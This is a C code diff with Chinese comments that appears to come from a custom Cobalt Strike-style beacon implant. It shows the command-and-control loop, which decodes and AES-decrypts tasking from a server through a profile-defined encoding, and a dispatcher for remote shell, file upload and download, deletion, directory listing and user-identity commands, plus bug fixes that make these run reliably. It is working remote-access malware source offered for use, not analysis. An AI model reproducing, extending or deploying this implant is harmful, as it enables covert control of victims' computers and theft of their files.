@@ -24,12 +24,23 @@ VOID beacon_main() {
         // 发送心跳的同时，获取响应内容
         size_t responseSize = 0;
         unsigned char* responseEncodeData = GET(cookie_header, &responseSize);
+        // 多分配一个字节为了放\0，不然后续 strlen 的长度和 responseSize 对不上
+        // responseSize > 7 ==> responseSize >= Prefix + Suffix
+        if (responseEncodeData && responseSize > 7) {
+            unsigned char* tmp = realloc(responseEncodeData, responseSize + 1);
+            if (tmp) {
+                responseEncodeData = tmp;
+                responseEncodeData[responseSize] = '\0';
+            }
+        }
 
         size_t responseDataLength = 0;
 
         // 在这个函数还要经过一次 NetBios 解码，一次 XOR 解密对应 Mask，因为 profile 这样写的
         unsigned char* responseData = parseGetResponse(responseEncodeData, responseSize, &responseDataLength);
+        // 必须放个\0，不然后续 strlen 会出现错误
 
+        // 确保为 16 的倍数，进行 AES 解密
         if (responseDataLength > 16 && responseDataLength % 16 == 0) {
             // 直接去掉 HMAC Hash，这里还没有未实现 Hash 校验
             size_t dataLength = responseDataLength;
@@ -51,15 +62,14 @@ VOID beacon_main() {
                 // 这四个字节是所有指令总长度
                 uint32_t bigEndianLenBytes = bigEndianUint32(lenBytes);     
                 // 指令数据，当有多条指令发过来时结构如下
-                // 指令数据包格式：cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(commandLen Bytes) || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
-                // commandLen 只是 commandBuf 的长度
+                // 指令数据包格式：?(4Bytes) |bigEndianLenBytes (4Bytes)| cmdType(4Bytes) | commandLen(4Bytes) 
+                // | commandBuf(commandLen Bytes) || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
                 unsigned char* decryptedBuf = decryptAES_CBCdata + 8;       
 
                 // 指令数据大小计数
                 size_t executeCount = 0;
 
                 while (1) {
-                    // 指令解析完了
                     if (bigEndianLenBytes <= 0) {
                         break;
                     }
@@ -73,8 +83,9 @@ VOID beacon_main() {
 
                     // 每解析一个指令 bigEndianLenBytes 会减少一个对应指令的长度
                     commandBuf = parsePacket(decryptedBuf, &bigEndianLenBytes, &commandType, &commandBuflen, &executeCount);
-
-                    executeCommand(commandBuf, commandType, commandBuflen);
+                    if (commandBuf) {
+                        executeCommand(commandBuf, commandType, commandBuflen);
+                    }
                 }
 
                 // 一次请求获取的全部指令的已经执行完毕 开始 free
@@ -106,46 +117,44 @@ int main() {
         callbackType = 22;
         postMsg = CmdFileBrowse(commandBuf, &msgLength);
         break;
-    case CMD_TYPE_UPLOAD_START:  // 0
+    case CMD_TYPE_UPLOAD_START:  // 1
         postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 1);
-        callbackType = -1;
+        callbackType = 0;
         break;
-    case CMD_TYPE_UPLOAD_LOOP:   // 0
+    case CMD_TYPE_UPLOAD_LOOP:   // 1
         postMsg = CmdUpload(commandBuf, &commandBuflen, &msgLength, 2);
-        callbackType = -1;
+        callbackType = 0;
         break;
     case  CMD_TYPE_DRIVES:       // 1
         callbackType = 22;
         postMsg = CmdDrives(commandBuf, &msgLength);
         break;
-    case  CMD_TYPE_MKDIR: // 1 
+    case  CMD_TYPE_MKDIR:        // 1 
         callbackType = 0;
         postMsg = CmdMkdir(commandBuf, &commandBuflen, &msgLength);
         break;
-    case CMD_TYPE_PWD:    // 1
+    case CMD_TYPE_PWD:           // 1
         callbackType = 0;
         postMsg = CmdPwd(commandBuf, &msgLength);
         break;
-    case CMD_TYPE_GETUID: //1
+    case CMD_TYPE_GETUID:        //1
         callbackType = 0;
         postMsg = CmdGetUid(commandBuf, &msgLength);
         break;
-    case CMD_TYPE_RM:     // 1
+    case CMD_TYPE_RM:            // 1
         callbackType = 0;
         postMsg = CmdFileRemove(commandBuf, &commandBuflen, &msgLength);
         break;
-    case CMD_TYPE_DOWNLOAD: // 1
-        callbackType = 0;
-        postMsg = CmdFileDownload(commandBuf, &commandBuflen, &msgLength);
+    case CMD_TYPE_DOWNLOAD:      // 1
+        callbackType = -1;
+        CmdFileDownload(commandBuf, &commandBuflen, &msgLength);
         break;
     case CMD_TYPE_SHELL:
-        callbackType = 0;
+        callbackType = -1;
         CmdShell(commandBuf, &commandBuflen);
-		// commanfBuf赋值为NULL，对于此分支不应该有由主线程负责free commanfBuf
 		// 因为 CmdShell 中会创建线程，线程中会使用 commanfBuf
 		// 线程结束后会自动释放 commanfBuf
 		// 如果提前释放 commanfBuf 会导致线程访问已释放内存
-        //commandBuf = NULL;
         break;
     case CMD_TYPE_Jobs:
         callbackType = -1;
@@ -188,12 +197,10 @@ int main() {
         memcpy(resultMemmory, result, strlen(result));
         postMsg = resultMemmory;
         msgLength = strlen(result);
+		postMsg[msgLength] = '\0';
         break;
     }
 
- //   if(commandBuf != NULL) {
- //       free(commandBuf);
-	//}
     free(commandBuf);
 
     if (callbackType >= 0 && postMsg) {
